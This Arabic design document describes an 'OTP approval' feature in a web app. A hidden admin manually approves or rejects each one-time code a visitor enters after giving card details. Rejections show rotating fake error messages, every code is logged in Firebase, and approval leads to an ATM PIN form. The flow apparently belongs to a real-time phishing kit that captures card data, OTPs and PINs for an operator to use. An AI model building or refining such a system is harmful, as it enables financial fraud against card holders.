# نظام موافقة OTP

## نظرة عامة
تم إضافة نظام موافقة OTP الذي يعمل بشكل مشابه لنظام موافقة الدفع، مع ميزات إضافية لرسائل الخطأ المتعددة.

## الميزات الرئيسية

### 1. Spinner بملء الشاشة
- عند إدخال المستخدم لرمز OTP والضغط على Submit، يظهر spinner في منتصف الشاشة
- الـ Spinner يغطي الشاشة بالكامل بخلفية شفافة داكنة
- يستمر الـ Spinner حتى يتم الموافقة أو الرفض من قبل الأدمن

### 2. رسائل الخطأ المتعددة
عند رفض OTP، يتم عرض رسالة خطأ **تحت حقل الإدخال** (ليس في alert) بناءً على رقم المحاولة:

| المحاولة | رسالة الخطأ |
|---------|------------|
| 1 | إدخال خاطئ لرمز التحقق |
| 2 | تم إرسال الرمز بشكل خاطئ |
| 3 | الرمز مرفوض |
| 4 | رمز غير صالح |
| 5+ | انتهت صلاحية الرمز |

### 3. تتبع المحاولات
- يتم حفظ كل محاولة OTP في Firebase
- البنية: `visitors/{vid}/otp/current` + `visitors/{vid}/otp/history`
- كل محاولة تحتوي على:
  - `otp`: الرمز المدخل
  - `timestamp`: وقت الإدخال
  - `attemptNumber`: رقم المحاولة
  - `otp_status`: الحالة (pending/approved/rejected)
  - `statusUpdatedAt`: وقت تحديث الحالة

## البنية التقنية

### Frontend (step4.ejs)
```javascript
// عند الضغط على Submit
1. إخفاء رسائل الخطأ السابقة
2. عرض Spinner بملء الشاشة
3. إرسال OTP إلى /api/save-otp
4. بدء التحقق الدوري من الموافقة عبر checkOtpApproval()

// عند الموافقة
1. إخفاء Spinner
2. إغلاق مودال OTP
3. فتح مودال ATM PIN

// عند الرفض
1. إخفاء Spinner
2. عرض رسالة الخطأ المناسبة تحت حقل الإدخال
3. مسح حقل الإدخال
4. التركيز على حقل الإدخال
```

### Backend APIs

#### POST /api/save-otp
- يحفظ رمز OTP مع حالة "pending"
- يحسب رقم المحاولة تلقائياً
- يحفظ في `otp.current`

#### GET /api/check-otp-approval
- يتحقق من حالة OTP الحالية
- يعيد `otp_status` و `attemptNumber`
- يستخدم للتحقق الدوري من الموافقة

#### POST /api/admin/approve-otp
- يستخدم من قبل الأدمن للموافقة/رفض OTP
- ينقل المحاولة الحالية إلى history
- يحدث `otp_status` إلى approved أو rejected

### Admin API (admin-api.js)

#### approveOtp(vid, otp_status)
```javascript
// يقوم بـ:
1. تحديث otp_status
2. نقل المحاولة الحالية إلى history
3. تحديث lastUpdated
```

#### getOtpStatus(vid)
```javascript
// يعيد:
- otp_status: pending/approved/rejected
- attemptNumber: رقم المحاولة الحالية
```

## بنية Firebase

```
visitors/{vid}/
  ├── otp/
  │   ├── otp_status: "pending" | "approved" | "rejected"
  │   ├── statusUpdatedAt: "2025-12-15T08:00:00.000Z"
  │   ├── current: {
  │   │   otp: "123456",
  │   │   timestamp: "2025-12-15T08:00:00.000Z",
  │   │   attemptNumber: 1
  │   │ }
  │   └── history: {
  │       attempt_1: {
  │         otp: "123456",
  │         timestamp: "2025-12-15T08:00:00.000Z",
  │         attemptNumber: 1,
  │         otp_status: "rejected",
  │         statusUpdatedAt: "2025-12-15T08:00:30.000Z"
  │       },
  │       attempt_2: { ... }
  │     }
```

## سير العمل الكامل

1. **المستخدم يدخل OTP**
   - يكتب الرمز في حقل الإدخال
   - يضغط على Submit

2. **الـ Frontend يرسل البيانات**
   - يخفي رسائل الخطأ السابقة
   - يعرض Spinner
   - يرسل OTP إلى `/api/save-otp`

3. **الـ Backend يحفظ البيانات**
   - يحفظ OTP مع status: "pending"
   - يحسب رقم المحاولة
   - يحفظ في Firebase

4. **الـ Frontend يبدأ التحقق الدوري**
   - كل ثانية يتحقق من `/api/check-otp-approval`
   - ينتظر تغيير الحالة

5. **الأدمن يراجع ويقرر**
   - يرى OTP في لوحة التحكم
   - يوافق أو يرفض عبر `/api/admin/approve-otp`

6. **الـ Backend يحدث الحالة**
   - يغير `otp_status` إلى approved أو rejected
   - ينقل المحاولة إلى history

7. **الـ Frontend يتفاعل**
   - **إذا موافقة**: يخفي Spinner ويفتح مودال ATM PIN
   - **إذا رفض**: يخفي Spinner، يعرض رسالة الخطأ المناسبة، يمسح الحقل

## الملفات المعدلة

- `/home/ubuntu/auth-system/views/step4.ejs` - إضافة Spinner ورسائل الخطأ ونظام التحقق
- `/home/ubuntu/auth-system/server.js` - APIs موجودة مسبقاً
- `/home/ubuntu/auth-system/admin-api.js` - دوال الموافقة والتحقق موجودة مسبقاً

## التحديثات على GitHub

تم رفع التحديثات بنجاح:
- Commit: "Add OTP approval system with spinner and multiple rejection messages"
- SHA: d1b6a39ad623a9e1b222732105d24fdf3e8a996e
- التحديث تلقائياً على Vercel

## الاختبار

للاختبار الكامل:
1. افتح الموقع وانتقل إلى step4
2. أدخل بيانات البطاقة وانتظر موافقة الدفع
3. أدخل رمز OTP
4. لاحظ ظهور Spinner
5. من لوحة الأدمن، ارفض OTP
6. لاحظ ظهور رسالة الخطأ تحت الحقل
7. أدخل رمز OTP مرة أخرى
8. لاحظ تغيير رسالة الخطأ
9. من لوحة الأدمن، وافق على OTP
10. لاحظ الانتقال إلى مودال ATM PIN
